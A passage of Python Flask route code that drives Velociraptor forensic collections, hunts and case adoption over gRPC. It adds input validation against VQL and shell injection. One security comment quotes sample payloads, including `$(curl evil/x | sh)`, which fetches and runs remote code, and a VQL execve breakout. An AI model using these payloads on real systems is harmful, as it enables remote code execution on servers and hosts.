#!/usr/bin/env python3
"""
Velociraptor Routes - Velociraptor endpoints
"""

from flask import Blueprint, jsonify, request
import time
import traceback
import sys
import json

from pyvelociraptor import api_pb2
from pyvelociraptor import api_pb2_grpc

from services import (
    run_kape_collection_grpc,
    add_job,
    create_automation_run,
    add_log_to_run,
    update_run_status
)
from services.velociraptor_service import setup_velociraptor_connection, get_artifact_definitions
from services.velociraptor_init_service import initialize_velociraptor_artifacts

velociraptor_bp = Blueprint('velociraptor', __name__)

@velociraptor_bp.route('/api/velociraptor/timesketch', methods=['POST'])
def run_timesketch_collection():
    """Run KAPE collection on a specific client for TimeSketch import using gRPC"""
    sys.stdout.flush()

    try:
        data = request.get_json(silent=True) or {}
        client_id = data.get('client_id')
        client_name = data.get('client_name', 'Unknown')  # Get client name (hostname)
        kape_target = data.get('kape_target', '_KapeTriage')  # Default to _KapeTriage
        timeout_seconds = data.get('timeout_seconds', 10000)  # Default ~2.8 hours
        cpu_limit = data.get('cpu_limit', 50)  # Default 50%
        blueprint_id = data.get('blueprint_id')
        blueprint_name = data.get('blueprint', 'Unknown')

        # SHAPE VALIDATION (Mythos finding #2). `client_id` and
        # `kape_target` flow downstream into `collect_client(client_id=
        # '...', artifacts='...')` VQL strings (kape_service.py:90, 246)
        # and into a `shell=True` `docker exec ... query "SELECT
        # cancel_flow(client_id='{cid}'...)"` cleanup callback below.
        # Without this check, `client_id` shaped like `C.x"); execve(
        # ...); --` injects VQL on the velociraptor server (RCE via
        # execve), and `client_id` like `$(curl evil/x | sh)` injects
        # on the backend container's shell (RCE via docker socket →
        # root on host). Legitimate IDs are always `C.<hex>` and
        # `kape_target` is always an artifact name; both shapes reject
        # the attack payloads with no false-positives for real
        # operator inputs.
        from services.vql_safety import is_valid_client_id, is_valid_artifact_name
        if not is_valid_client_id(client_id):
            return jsonify({"error": "client_id is required and must match C.<hex>"}), 400
        if not is_valid_artifact_name(kape_target):
            return jsonify({"error": "kape_target must be a Velociraptor artifact name"}), 400

        # If a blueprint was provided, load its settings so this manual-run
        # path uses the same ceilings as the scheduled path. Without this,
        # a manual "Run TimeSketch now" click would still hit Velociraptor's
        # 1 GiB hardcoded upload cap.
        kape_max_file_size       = 10737418240
        kape_max_hash_size       = 0
        kape_collection_policy   = 'ExcludeSigned'
        flow_max_rows            = 10000000
        flow_max_logs            = 1000000
        flow_max_upload_mb       = 51200
        if blueprint_id:
            from services.file_storage_service import get_timesketch_blueprint
            bp = get_timesketch_blueprint(blueprint_id)
            if bp:
                bp_settings = bp.get('settings', {}) or {}
                kape_max_file_size     = bp_settings.get('kape_max_file_size', kape_max_file_size)
                kape_max_hash_size     = bp_settings.get('kape_max_hash_size', kape_max_hash_size)
                kape_collection_policy = bp_settings.get('kape_collection_policy', kape_collection_policy)
                flow_max_rows          = bp_settings.get('flow_max_rows', flow_max_rows)
                flow_max_logs          = bp_settings.get('flow_max_logs', flow_max_logs)
                flow_max_upload_mb     = bp_settings.get('flow_max_upload_mb', flow_max_upload_mb)

        print(f"\n{'='*80}", flush=True)
        print(f"[API] Timesketch collection request received", flush=True)
        print(f"[API] Client ID: {client_id}", flush=True)
        print(f"[API] Client Name: {client_name}", flush=True)
        print(f"[API] KAPE Target: {kape_target}", flush=True)
        print(f"[API] Timeout: {timeout_seconds}s, CPU Limit: {cpu_limit}%", flush=True)
        print(f"{'='*80}\n", flush=True)

        # Run KAPE collection via gRPC (resource caps + artifact env from blueprint)
        flow_id = run_kape_collection_grpc(
            client_id, kape_target, timeout_seconds, cpu_limit,
            max_rows=flow_max_rows,
            max_logs=flow_max_logs,
            max_upload_mb=flow_max_upload_mb,
            max_file_size=kape_max_file_size,
            max_hash_size=kape_max_hash_size,
            collection_policy=kape_collection_policy,
        )

        if not flow_id:
            print(f"[API] ✗ Failed to start KAPE collection", flush=True)
            return jsonify({"error": "Failed to start KAPE collection via gRPC"}), 500

        # Create workflow run immediately with client name
        run_id = create_automation_run(
            automation_type="timesketch",
            name=f"TimeSketch Automation - {client_name}",
            details={
                "flow_id": flow_id,
                "client_id": client_id,
                "client_name": client_name,
                "kape_target": kape_target,
                "timeout_seconds": timeout_seconds,
                "cpu_limit": cpu_limit,
                "blueprint_id": blueprint_id,
                "blueprint": blueprint_name
            }
        )
        add_log_to_run(run_id, f"Starting TimeSketch automation for {client_name}", "info")
        add_log_to_run(run_id, f"KAPE Target: {kape_target}", "info")
        add_log_to_run(run_id, f"Collection timeout: {timeout_seconds}s, CPU limit: {cpu_limit}%", "info")
        # Air-gap preflight: KAPE triage needs the KAPE tool served locally.
        try:
            from services.velociraptor_service import hunt_tool_preflight
            hunt_tool_preflight(lambda m, lvl="info": add_log_to_run(run_id, m, lvl))
        except Exception:
            pass
        update_run_status(run_id, "running", progress=5)

        # Register cancel event so Stop can cancel the velociraptor
        # flow + abort the downstream /api/timesketch/import monitor.
        # The downstream import endpoint already has its own cancel
        # registration; this one covers the gap between KAPE dispatch
        # and the operator calling import.
        from services.workflow_service import register_cancel_event, register_cleanup
        register_cancel_event(run_id)
        # Cleanup callback cancels the Velociraptor flow when Stop is
        # clicked — so the endpoint stops collecting + uploading too.
        # `cid` is shape-validated above (^C\.[0-9a-f]+$); `fid` came
        # from `run_kape_collection_grpc` (server-generated, not
        # operator input). Subprocess is arg-list form + shell=False
        # as defense-in-depth — even if a future code change drops the
        # validator, the args never pass through a shell parser so
        # injection via $(...)/backtick/quotes can't reach the host.
        def _cancel_velo_flow(cid=client_id, fid=flow_id):
            try:
                import subprocess as _sp
                _sp.run(
                    [
                        "docker", "exec", "intact_velociraptor",
                        "/velociraptor/velociraptor",
                        "--api_config", "/velociraptor/api.config.yaml",
                        "--nobanner", "query",
                        f"SELECT cancel_flow(client_id='{cid}', flow_id='{fid}') FROM scope()",
                    ],
                    shell=False, capture_output=True, timeout=10,
                )
            except Exception:
                pass
        register_cleanup(run_id, _cancel_velo_flow)

        # Track the job with run_id
        add_job(flow_id, {
            "flow_id": flow_id,
            "client_id": client_id,
            "client_name": client_name,
            "artifact_id": "kape",
            "artifact_name": "KAPE Collection",
            "kape_target": kape_target,
            "timeout_seconds": timeout_seconds,
            "cpu_limit": cpu_limit,
            "status": "collecting",
            "started_at": int(time.time()),
            "phase": "KAPE Collection",
            "run_id": run_id  # Store run_id for later use
        })

        print(f"[API] ✓ KAPE collection started successfully", flush=True)
        print(f"[API] Flow ID: {flow_id}", flush=True)
        print(f"[API] Workflow Run ID: {run_id}\n", flush=True)

        return jsonify({
            "flow_id": flow_id,
            "client_id": client_id,
            "client_name": client_name,
            "artifact": "KAPE Collection",
            "kape_target": kape_target,
            "status": "collecting",
            "phase": "KAPE Collection",
            "run_id": run_id,
            "message": "KAPE collection started. Call /api/timesketch/import with this flow_id to start the full pipeline."
        })

    except Exception as e:
        print(f"[API] ✗ Error starting KAPE collection: {e}", flush=True)
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500


def _sanitize_hunt_labels(raw):
    """Normalise an optional include_labels value from a hunt request into a
    clean list of label strings. Anything not a non-empty string is dropped;
    duplicates removed; capped at 64 labels of <=256 chars each. Returns [] for
    missing/invalid input — and an empty list means the hunt targets ALL clients
    (no label condition). json.dumps quotes the labels safely into the VQL, but
    we still bound the shape here."""
    if not isinstance(raw, list):
        return []
    out = []
    for x in raw:
        if isinstance(x, str):
            s = x.strip()
            if s and len(s) <= 256 and s not in out:
                out.append(s)
        if len(out) >= 64:
            break
    return out


def _hunt_labels_clause(include_labels):
    """VQL fragment (indented, trailing comma+newline) that adds
    include_labels=[...] to a hunt() call — or '' when no labels are given, so
    the hunt runs on every client."""
    if not include_labels:
        return ""
    return f"    include_labels={json.dumps(include_labels)},\n"


def _create_single_velo_hunt(stub, artifacts, hunt_desc, expire_seconds, timeout_seconds,
                             cpu_limit, flow_max_rows, flow_max_bytes, log_fn,
                             include_labels=None):
    """Build + send the VQL `hunt()` call against the Velociraptor gRPC
    stub for a given artifact list, return `(hunt_id, error_str)`.

    Used by both the bulk path (artifacts = full list) and the
    per-artifact path (artifacts = a one-element list). Keeps the gRPC
    plumbing in one place. ``include_labels`` (optional) scopes the hunt to
    clients carrying ANY of those Velociraptor labels; empty => all clients."""
    artifacts_list = json.dumps(artifacts)
    spec_parts = ", ".join([f"`{a}`=dict()" for a in artifacts])
    # max_logs is rejected by hunt() (collect_client-only) so we omit.
    query = f"""
LET collection = hunt(
    description={json.dumps(hunt_desc)},
    artifacts={artifacts_list},
    spec=dict({spec_parts}),
    expires=now() + {expire_seconds},
    timeout={timeout_seconds},
{_hunt_labels_clause(include_labels)}    max_rows={flow_max_rows},
    max_bytes={flow_max_bytes},
    cpu_limit={cpu_limit}
)
SELECT HuntId FROM collection
"""
    request_obj = api_pb2.VQLCollectorArgs(
        max_wait=30,
        max_row=100,
        Query=[api_pb2.VQLRequest(VQL=query)],
    )
    hunt_id = None
    response_errors = []
    response_count = 0
    for response in stub.Query(request_obj, timeout=120):
        response_count += 1
        if response.log:
            log_fn(f"Velociraptor log: {response.log}",
                   "warning" if "error" in response.log.lower() else "info")
        if response.Response:
            try:
                resp_data = json.loads(response.Response)
                if resp_data:
                    hunt_id = (resp_data[0] or {}).get('HuntId') or hunt_id
            except Exception as parse_err:
                response_errors.append(f"parse: {parse_err}")
    if hunt_id:
        return hunt_id, None
    reasons = []
    if response_count == 0:
        reasons.append("no responses from Velociraptor")
    if response_errors:
        reasons.append("; ".join(response_errors))
    if not reasons:
        reasons.append("no HuntId in any response")
    return None, " | ".join(reasons)


@velociraptor_bp.route('/api/velociraptor/bestpractice', methods=['POST'])
def run_bestpractice_hunts():
    """Run multiple artifacts as hunts (BestPractice workflow).

    Two dispatch modes controlled by `per_artifact`:
      - false (default): one bulk hunt with every artifact in one
        Velociraptor hunt object + one workflow row.
      - true: one hunt PER artifact — N Velociraptor hunts + N workflow
        rows so the operator can monitor / cancel / re-run each
        artifact independently.
    """
    try:
        data = request.get_json(silent=True) or {}
        artifacts = data.get('artifacts', [])

        # SHAPE VALIDATION (Mythos #4 extended): each artifact name
        # gets interpolated into a VQL `hunt(artifacts=[...], ...)`
        # string at lines ~210 and ~405. Velociraptor's parser today
        # rejects malformed names — but that's the wrong layer to
        # rely on. Validate the shape at the route entry: every legit
        # Velociraptor artifact follows `^[A-Za-z0-9_.\-:]+$`, attack
        # shapes (quotes, parens, semicolons) never match.
        if not isinstance(artifacts, list):
            return jsonify({"error": "artifacts must be a list of artifact names"}), 400
        if len(artifacts) > 500:
            return jsonify({"error": "artifacts list too long (>500 items)"}), 400
        from services.vql_safety import is_valid_artifact_name
        for i, a in enumerate(artifacts):
            if not isinstance(a, str) or not is_valid_artifact_name(a):
                return jsonify({
                    "error": f"artifacts[{i}] is not a valid Velociraptor artifact name"
                }), 400
        blueprint_name = data.get('blueprint_name', 'Custom')
        expire_minutes = data.get('expire_minutes', 120)
        timeout_seconds = data.get('timeout_seconds', 10000)
        cpu_limit = data.get('cpu_limit', 50)
        per_artifact = bool(data.get('per_artifact', False))
        # Optional label targeting: scope the hunt to clients carrying any of
        # these Velociraptor labels. Empty/missing => run on ALL clients.
        include_labels = _sanitize_hunt_labels(data.get('include_labels'))
        # Optional blueprint_id lets us pull resource caps from the stored
        # blueprint settings (instead of inheriting old hardcoded defaults).
        # When absent, the request body can override directly via flow_max_*
        # keys, otherwise we apply the new conservative defaults.
        blueprint_id = data.get('blueprint_id')
        flow_max_rows      = 10000000
        flow_max_logs      = 1000000
        flow_max_upload_mb = 51200
        if blueprint_id:
            from services.file_storage_service import get_velociraptor_blueprint
            bp = get_velociraptor_blueprint(blueprint_id)
            if bp:
                bps = bp.get('settings', {}) or {}
                flow_max_rows      = bps.get('flow_max_rows', flow_max_rows)
                flow_max_logs      = bps.get('flow_max_logs', flow_max_logs)
                flow_max_upload_mb = bps.get('flow_max_upload_mb', flow_max_upload_mb)
        # Caller-supplied values take final priority
        flow_max_rows      = data.get('flow_max_rows', flow_max_rows)
        flow_max_logs      = data.get('flow_max_logs', flow_max_logs)
        flow_max_upload_mb = data.get('flow_max_upload_mb', flow_max_upload_mb)
        flow_max_bytes     = int(flow_max_upload_mb) * 1024 * 1024

        if not artifacts:
            return jsonify({"error": "artifacts list is required"}), 400

        print(f"\n{'='*80}", flush=True)
        print(f"[HUNT] Starting Velociraptor hunt: {blueprint_name}", flush=True)
        print(f"[HUNT] Artifacts: {len(artifacts)} artifacts (per_artifact={per_artifact})", flush=True)
        print(f"[HUNT] Expire: {expire_minutes}m, Timeout: {timeout_seconds}s, CPU: {cpu_limit}%", flush=True)
        print(f"{'='*80}\n", flush=True)

        # ───────────────────────────────────────────────────────────────
        # PER-ARTIFACT BRANCH — one workflow row + one Velociraptor hunt
        # per artifact. Branches off the bulk path entirely so the rest
        # of this function is the unchanged bulk behaviour.
        # ───────────────────────────────────────────────────────────────
        if per_artifact:
            expire_seconds = expire_minutes * 60
            channel = setup_velociraptor_connection()
            if not channel:
                return jsonify({"error": "Failed to connect to Velociraptor"}), 500
            stub = api_pb2_grpc.APIStub(channel)
            results = []
            run_ids = []
            # Register cancel for each row up front so the operator can
            # Stop the per-artifact dispatch loop mid-flight (e.g. when
            # they picked 30 artifacts and want to cancel after 3 hunts).
            from services.workflow_service import register_cancel_event, is_cancelled
            try:
                for a in artifacts:
                    rid = create_automation_run(
                        automation_type="velociraptor_hunt",
                        name=f"{blueprint_name} · {a}",
                        details={
                            "blueprint": blueprint_name,
                            "artifact_count": 1,
                            "artifact": a,
                            "expire_minutes": expire_minutes,
                            "timeout_seconds": timeout_seconds,
                            "cpu_limit": cpu_limit,
                            "per_artifact": True,
                            "is_agentic": "agentic" in (blueprint_name or "").lower(),
                        },
                    )
                    run_ids.append(rid)
                    register_cancel_event(rid)
                    # Honour Stop on THIS row before dispatching the
                    # next hunt. We can't kill an already-dispatched
                    # Velociraptor hunt from here (those run on the
                    # server side), but we can stop creating more.
                    if is_cancelled(rid):
                        update_run_status(rid, "cancelled")
                        results.append({"artifact": a, "run_id": rid, "hunt_id": None, "status": "cancelled"})
                        continue
                    add_log_to_run(rid, f"Starting per-artifact hunt for `{a}`")
                    add_log_to_run(rid, f"Settings: Expire={expire_minutes}m, Timeout={timeout_seconds}s, CPU={cpu_limit}%")
                    add_log_to_run(rid, f"Targeting clients with labels: {', '.join(include_labels)}"
                                   if include_labels else "Targeting ALL clients (no label filter)")
                    hunt_desc = f"{blueprint_name} · {a}"
                    hunt_id, err = _create_single_velo_hunt(
                        stub, [a], hunt_desc, expire_seconds, timeout_seconds,
                        cpu_limit, flow_max_rows, flow_max_bytes,
                        log_fn=lambda m, lvl='info', _rid=rid: add_log_to_run(_rid, m, lvl),
                        include_labels=include_labels,
                    )
                    if hunt_id:
                        add_log_to_run(rid, f"Hunt created: {hunt_id}")
                        # 'running', not 'completed' — the hunt was only just
                        # dispatched. dashboard_routes.get_automation_details()
                        # flips this to 'completed' once Velociraptor reports
                        # every scheduled client's flow actually finished.
                        update_run_status(rid, "running", progress=90,
                                          details={"hunt_id": hunt_id, "artifacts": [a]})
                        results.append({"artifact": a, "run_id": rid, "hunt_id": hunt_id, "status": "success"})
                    else:
                        # Don't log error if this row got cancelled mid-create
                        if is_cancelled(rid):
                            results.append({"artifact": a, "run_id": rid, "hunt_id": None, "status": "cancelled"})
                            continue
                        add_log_to_run(rid, f"Failed: {err}", "error")
                        update_run_status(rid, "failed", progress=0)
                        results.append({"artifact": a, "run_id": rid, "hunt_id": None, "status": "failed", "error": err})
            finally:
                channel.close()
            success_n = sum(1 for r in results if r['status'] == 'success')
            print(f"[HUNT] Per-artifact dispatch: {success_n}/{len(artifacts)} hunts created", flush=True)
            return jsonify({
                "message": f"Dispatched {success_n}/{len(artifacts)} per-artifact hunts",
                "run_ids": run_ids,
                "results": results,
            })

        # Create workflow run entry
        run_id = create_automation_run(
            automation_type="velociraptor_hunt",
            name=f"{blueprint_name} ({len(artifacts)} artifacts)",
            # Tag agentic-or-general from the blueprint name ('[Agentic] …' /
            # 'Velociraptor Agentic: …'). The hunt fuses either way; this only
            # decides 'Velociraptor (Agentic)' vs 'Velociraptor (All)' inclusion.
            details={"blueprint": blueprint_name, "artifact_count": len(artifacts), "expire_minutes": expire_minutes, "timeout_seconds": timeout_seconds, "cpu_limit": cpu_limit, "is_agentic": "agentic" in (blueprint_name or "").lower()}
        )
        add_log_to_run(run_id, f"Starting hunt with {len(artifacts)} artifacts")
        add_log_to_run(run_id, f"Settings: Expire={expire_minutes}m, Timeout={timeout_seconds}s, CPU={cpu_limit}%")
        # Air-gap preflight: warn clearly if endpoint tools aren't served
        # locally and there's no internet (those artifacts would otherwise fail
        # on the endpoint with a cryptic DNS error).
        try:
            from services.velociraptor_service import hunt_tool_preflight
            hunt_tool_preflight(lambda m, lvl="info": add_log_to_run(run_id, m, lvl))
        except Exception:
            pass

        channel = setup_velociraptor_connection()
        if not channel:
            add_log_to_run(run_id, "ERROR: Failed to connect to Velociraptor", "error")
            update_run_status(run_id, "failed", progress=0)
            return jsonify({"error": "Failed to connect to Velociraptor", "run_id": run_id}), 500

        stub = api_pb2_grpc.APIStub(channel)

        # Convert expire_minutes to seconds for VQL
        expire_seconds = expire_minutes * 60

        # Build artifact list and spec for bulk hunt
        artifacts_list = json.dumps(artifacts)
        spec_parts = ", ".join([f'`{a}`=dict()' for a in artifacts])
        # blueprint_name is free-form (unlike artifacts, which are
        # shape-validated above), so it must never be spliced into the VQL
        # literal raw. JSON-encode it exactly like _create_single_velo_hunt()
        # does for hunt_desc, closing the same VQL-injection class described
        # in this codebase's own security history (unescaped hunt
        # description/name reaching execve()).
        bulk_description = json.dumps(f"{blueprint_name} ({len(artifacts)} artifacts)")

        # hunt() rejects max_logs (collect_client-only arg), so we omit it.
        # flow_max_logs is still honored on the TimeSketch / collect_client path.
        _ = flow_max_logs  # intentionally unused here
        # Create single bulk hunt with all artifacts
        query = f"""
LET collection = hunt(
    description={bulk_description},
    artifacts={artifacts_list},
    spec=dict({spec_parts}),
    expires=now() + {expire_seconds},
    timeout={timeout_seconds},
{_hunt_labels_clause(include_labels)}    max_rows={flow_max_rows},
    max_bytes={flow_max_bytes},
    cpu_limit={cpu_limit}
)
SELECT HuntId FROM collection
"""

        add_log_to_run(run_id, f"Creating bulk hunt with {len(artifacts)} artifacts")
        add_log_to_run(run_id, f"Targeting clients with labels: {', '.join(include_labels)}"
                       if include_labels else "Targeting ALL clients (no label filter)")
        print(f"[HUNT] Creating bulk hunt with {len(artifacts)} artifacts", flush=True)
        print(f"[HUNT] VQL Query:\n{query}", flush=True)

        request_obj = api_pb2.VQLCollectorArgs(
            max_wait=30,
            max_row=100,
            Query=[api_pb2.VQLRequest(VQL=query)]
        )

        hunt_id = None
        response_errors = []
        response_count = 0
        for response in stub.Query(request_obj, timeout=120):
            response_count += 1

            if response.log:
                log_msg = f"Velociraptor log: {response.log}"
                print(f"[HUNT] {log_msg}", flush=True)
                add_log_to_run(run_id, log_msg, "warning" if "error" in response.log.lower() else "info")

            if response.Response:
                print(f"[HUNT] Raw response: {response.Response[:500]}", flush=True)
                try:
                    resp_data = json.loads(response.Response)
                    if resp_data and len(resp_data) > 0:
                        hunt_id = resp_data[0].get('HuntId')
                        if hunt_id:
                            add_log_to_run(run_id, f"Hunt created: {hunt_id}", "info")
                except Exception as parse_err:
                    error_msg = f"Failed to parse response: {str(parse_err)}"
                    print(f"[HUNT] {error_msg}", flush=True)
                    add_log_to_run(run_id, error_msg, "error")
                    response_errors.append(error_msg)

        channel.close()

        results = []
        if hunt_id:
            print(f"[HUNT] Bulk hunt created: {hunt_id} ({len(artifacts)} artifacts)", flush=True)
            add_log_to_run(run_id, f"Bulk hunt created: {hunt_id} with {len(artifacts)} artifacts")
            # persist the hunt_id so Case Analysis can pull + fuse the hunt's rows.
            # 'running', not 'completed' — see the per-artifact branch above for why.
            update_run_status(run_id, "running", progress=90,
                              details={"hunt_id": hunt_id, "artifacts": artifacts})
            results = [{"artifact": "all", "hunt_id": hunt_id, "status": "success"}]
        else:
            failure_reasons = []
            if response_count == 0:
                failure_reasons.append("No responses received from Velociraptor")
            if response_errors:
                failure_reasons.append(f"Parse errors: {'; '.join(response_errors)}")
            if not failure_reasons:
                failure_reasons.append("Velociraptor returned responses but no HuntId was found")

            error_detail = " | ".join(failure_reasons)
            print(f"[HUNT] Failed to create bulk hunt: {error_detail}", flush=True)
            add_log_to_run(run_id, f"Failed: {error_detail}", "error")
            update_run_status(run_id, "failed", progress=0)
            results = [{"artifact": "all", "hunt_id": None, "status": "failed", "error": error_detail}]

        success_count = 1 if hunt_id else 0
        print(f"\n[HUNT] {'Hunt created' if hunt_id else 'Failed'}: {hunt_id or 'N/A'}\n", flush=True)

        return jsonify({
            "message": f"Created bulk hunt with {len(artifacts)} artifacts" if hunt_id else "Failed to create hunt",
            "run_id": run_id,
            "hunt_id": hunt_id,
            "results": results
        })

    except Exception as e:
        error_msg = f"Critical error in hunt workflow: {str(e)}"
        print(f"[HUNT] ✗ {error_msg}", flush=True)
        traceback.print_exc()

        # Try to log error to workflow if run_id exists
        try:
            if 'run_id' in locals():
                add_log_to_run(run_id, f"✗ {error_msg}", "error")
                add_log_to_run(run_id, f"Traceback: {traceback.format_exc()}", "error")
                update_run_status(run_id, "failed", progress=0)
        except:
            pass

        return jsonify({"error": str(e)}), 500


@velociraptor_bp.route('/api/velociraptor/hunts/status', methods=['GET'])
def get_hunts_status():
    """Get status of recent hunts"""
    try:
        channel = setup_velociraptor_connection()
        if not channel:
            return jsonify({"error": "Failed to connect to Velociraptor"}), 500

        stub = api_pb2_grpc.APIStub(channel)

        # Get recent hunts
        query = "SELECT hunt_id, description, state, create_time, start_time FROM hunts() ORDER BY create_time DESC LIMIT 10"

        request_obj = api_pb2.VQLCollectorArgs(
            max_wait=30,
            max_row=100,
            Query=[api_pb2.VQLRequest(VQL=query)]
        )

        hunts = []
        for response in stub.Query(request_obj, timeout=30):
            if response.Response:
                try:
                    resp_data = json.loads(response.Response)
                    if resp_data:
                        hunts.extend(resp_data)
                except:
                    pass

        channel.close()

        return jsonify({"hunts": hunts})

    except Exception as e:
        print(f"[HUNTS] ✗ Error getting hunt status: {e}", flush=True)
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500


@velociraptor_bp.route('/api/velociraptor/labels', methods=['GET'])
def get_client_labels():
    """Distinct Velociraptor client labels in use — populates the hunt
    label-target picker in the GUI. Empty list means no labels exist (so a hunt
    runs on all clients). Best-effort: returns {labels: []} if the query fails
    so the GUI degrades to 'all clients' rather than erroring."""
    try:
        channel = setup_velociraptor_connection()
        if not channel:
            return jsonify({"labels": []})
        stub = api_pb2_grpc.APIStub(channel)
        # Pull each client's labels[] and flatten in Python — robust across
        # Velociraptor versions (a VQL foreach(column='labels') flatten returned
        # NULLs). Skip Velociraptor's auto-labels (the GUI hides these too):
        # they start with "label:" only when user-set; the built-ins are
        # prefixed differently, so we keep every non-empty string.
        query = "SELECT labels FROM clients() WHERE labels"
        labels = set()
        for response in stub.Query(api_pb2.VQLCollectorArgs(
                max_wait=20, max_row=5000,
                Query=[api_pb2.VQLRequest(VQL=query)]), timeout=25):
            if response.Response:
                try:
                    for d in json.loads(response.Response):
                        for lbl in (d.get('labels') or []):
                            if isinstance(lbl, str) and lbl.strip():
                                labels.add(lbl.strip())
                except Exception:
                    pass
        channel.close()
        return jsonify({"labels": sorted(labels)})
    except Exception as e:
        print(f"[LABELS] ✗ Error listing client labels: {e}", flush=True)
        return jsonify({"labels": []})


# ============================================================================
# Artifact Definitions
# ============================================================================

# Cache for artifact definitions (refreshed every 5 minutes)
_artifact_cache = {"data": None, "timestamp": 0}
_ARTIFACT_CACHE_TTL = 300  # 5 minutes


@velociraptor_bp.route('/api/velociraptor/artifacts', methods=['GET'])
def get_artifacts():
    """Get all available artifact definitions from Velociraptor.

    Returns cached data if available and fresh (< 5 min old).
    Use ?refresh=true to force refresh.
    """
    import time

    force_refresh = request.args.get('refresh', '').lower() == 'true'
    current_time = time.time()

    # Return cached data if fresh
    if not force_refresh and _artifact_cache["data"] and (current_time - _artifact_cache["timestamp"]) < _ARTIFACT_CACHE_TTL:
        return jsonify({
            "artifacts": _artifact_cache["data"],
            "cached": True,
            "count": len(_artifact_cache["data"])
        })

    # Fetch fresh data
    artifacts = get_artifact_definitions()

    if artifacts is None:
        # Return cached data if available, even if stale
        if _artifact_cache["data"]:
            return jsonify({
                "artifacts": _artifact_cache["data"],
                "cached": True,
                "stale": True,
                "count": len(_artifact_cache["data"]),
                "error": "Could not refresh - using stale cache"
            })
        return jsonify({"error": "Failed to connect to Velociraptor"}), 500

    # Update cache
    _artifact_cache["data"] = artifacts
    _artifact_cache["timestamp"] = current_time

    return jsonify({
        "artifacts": artifacts,
        "cached": False,
        "count": len(artifacts)
    })


# =============================================================================
# Adopt an existing Velociraptor flow / hunt into the active case
# =============================================================================
#
# Closes the loop the product was missing: investigators work in parallel in the
# Velociraptor GUI, and until now nothing they collected there could ever reach
# an Intact case — a case could only contain runs Intact itself dispatched (or an
# offline-collector ZIP). So the case froze as a snapshot of the automated pass
# while the real investigation walked away from it.
#
# This is deliberately NOT a second launch path. It starts no collection and
# touches no endpoint: it reads results the Velociraptor server ALREADY holds for
# an id the operator types, through the exact same fetch fusion uses
# (get_existing_collection_results), filtered to SUPPORTED_ARTIFACTS at the
# boundary so no unmapped raw Velociraptor data enters the graph.

_ADOPT_ID_HINT = ("Expected a Velociraptor flow id (F.XXXXXXXX), "
                  "a hunt id (H.XXXXXXXX), or a hunt-derived flow id (F.XXXXXXXX.H).")


def _adopt_normalize_id(value):
    """('hunt'|'flow', canonical_id) for a well-formed id, else (None, None).

    A hunt-derived flow id (F.xxx.H) IS a hunt: get_existing_collection_results
    normalizes it to H.xxx before querying hunt_flows(), so classify it as one
    here too — otherwise it would take the single-flow path and find nothing.
    """
    from services.agentic.collectors._base import _is_valid_hunt_or_derived_flow_id
    from services.vql_safety import is_valid_flow_id

    v = (value or "").strip()
    if not v:
        return None, None
    if _is_valid_hunt_or_derived_flow_id(v):
        return "hunt", v
    if is_valid_flow_id(v):
        return "flow", v
    return None, None


def _adopt_ids_in_details(details):
    """Every Velociraptor locator a run row names, lowercased for comparison.

    Covers the four shapes runs actually store: `flow_id` (a LIST when several
    clients were selected, a bare string when one was), `hunt_id`, and the
    `offline_*` pair an offline-collector import stamps.
    """
    out = set()
    for key in ("flow_id", "hunt_id", "offline_flow_id", "offline_hunt_id"):
        val = (details or {}).get(key)
        if isinstance(val, list):
            out.update(str(v).strip().lower() for v in val if v)
        elif val:
            out.add(str(val).strip().lower())
    return out


def _adopt_existing_run(case_id, ident):
    """The run already holding `ident` IN THIS CASE, or None.

    Scoped to the case on purpose: the operator asked for "an id that doesn't
    exist in this specific case". The same flow legitimately belongs to two
    cases when one incident spans them, so this is a duplicate check, not an
    ownership claim.
    """
    from services.workflow_service import get_automation_runs_by_case
    needle = {ident.strip().lower()}
    # F.xxx.H and H.xxx are the same hunt wearing two names — compare both.
    if ident.startswith("F.") and ident.endswith(".H"):
        needle.add(("H." + ident[2:-2]).lower())
    elif ident.startswith("H."):
        needle.add(("F." + ident[2:] + ".H").lower())
    for run in (get_automation_runs_by_case(case_id) or []):
        if _adopt_ids_in_details(run.get("details")) & needle:
            return run
    return None


def _adopt_worker(run_id, kind, ident):
    """Read the flow/hunt's supported rows and persist them where fusion looks.

    Owns the run's terminal state on EVERY path, including the empty ones — a
    run left at 'running' is a row the operator can never clear, and one marked
    'completed' with nothing in it is worse: the fuse would count it as a member
    that contributed zero and never look at it again.
    """
    from services.agentic.collectors import (
        get_existing_collection_results, persist_pipeline_artifacts)
    from services.fusion.mappers.agentic import SUPPORTED_ARTIFACTS
    from services.workflow_service import mutate_run_details

    try:
        update_run_status(run_id, "running", progress=5)
        add_log_to_run(run_id, f"=== Adopting Velociraptor {kind} {ident} ===")
        add_log_to_run(run_id, "Reading results the Velociraptor server already "
                               "holds. No collection is started and no endpoint "
                               "is contacted.")
        add_log_to_run(run_id, f"Artifact filter: fusion's supported set "
                               f"({len(SUPPORTED_ARTIFACTS)} artifacts). Anything "
                               f"else in this collection is skipped.")
        update_run_status(run_id, "running", progress=10)

        if kind == "hunt":
            results, artifacts, client_info = get_existing_collection_results(
                run_id, hunt_id=ident,
                only_artifacts=SUPPORTED_ARTIFACTS, progress_log=True)
        else:
            # No client scoping: the fetch enumerates every client and locates
            # the flow itself, so asking the operator which host it came from
            # bought nothing but a field to get wrong.
            results, artifacts, client_info = get_existing_collection_results(
                run_id, flow_id=ident,
                only_artifacts=SUPPORTED_ARTIFACTS, progress_log=True)

        update_run_status(run_id, "running", progress=85)
        total = sum(len(rows) for rows in (results or {}).values())
        if total == 0:
            msg = (f"No supported artifacts found in {ident}. Fusion ingests only "
                   f"the artifacts it has mappers for — see the log above for what "
                   f"this collection contained and what was skipped.")
            add_log_to_run(run_id, msg, "error")
            update_run_status(run_id, "failed", error=msg)
            return

        hostnames = {str(cid): (info or {}).get("hostname")
                     for cid, info in (client_info or {}).items()
                     if cid and (info or {}).get("hostname")}

        def _stamp(det):
            det["hostnames"] = {**(det.get("hostnames") or {}), **hostnames}
            det["artifacts"] = sorted(artifacts or [])
            det["total_rows"] = total
            # A FLOW locator must carry its client_id: at fuse time
            # _velo_hunt_contribution re-pulls live and needs flow_id AND
            # client_id together. Nobody supplies it, so persist whichever client
            # the fetch resolved the flow on — without this the adopted flow
            # fuses once and can never be re-read.
            if kind == "flow" and not det.get("client_id"):
                resolved = next(iter(client_info or {}), None)
                if resolved:
                    det["client_id"] = resolved

        mutate_run_details(run_id, _stamp)

        for cid, info in sorted((client_info or {}).items()):
            host = (info or {}).get("hostname") or "unknown host"
